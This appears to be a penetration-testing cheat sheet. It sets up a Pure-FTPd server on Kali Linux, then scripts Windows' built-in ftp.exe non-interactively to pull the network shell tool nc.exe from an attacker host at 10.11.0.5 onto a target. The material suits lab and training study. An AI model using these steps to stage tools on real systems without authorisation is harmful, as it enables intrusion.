FTP

Info: File Transfer Protocol
Hints: Windows operating systems contain a default FTP client, ftp.exe


Commands

Set up FTP server in kali 

root@kali:~# apt-get update && apt-get install pure-ftpd


Create a new user for PureFTPd

#!/bin/bash
groupadd ftpgroup #add the group ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser 
pure-pw useradd offsec -u ftpuser -d /ftphome #add user 'offsec'
pure-pw mkdb #create the database
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/ 
/etc/init.d/pure-ftpd restart


Run script and provide password when prompted

root@kali:~# chmod 755 setup-ftp 
root@kali:~# ./setup-ftp 

Hint: On running the scripts when prompted, set the password as 'ftp' for the next commands to work


On Windows, send the following commands

C:\Users\offsec>echo open 10.11.0.5 21> ftp.txt   #write "open 10.11.0.5 21 to file ftp.txt"
C:\Users\offsec>echo USER offsec>> ftp.txt #Append "USER offsec" to file ftp.txt
C:\Users\offsec>echo ftp>> ftp.txt 
C:\Users\offsec>echo bin >> ftp.txt 
C:\Users\offsec>echo GET nc.exe >> ftp.txt 
C:\Users\offsec>echo bye >> ftp.txt 
C:\Users\offsec>ftp –v -n -s:ftp.txt #Run ftp non-interactively with the -s flag to get specify the commands to run on ftp start and -n flag to supress autologin upon initial connection









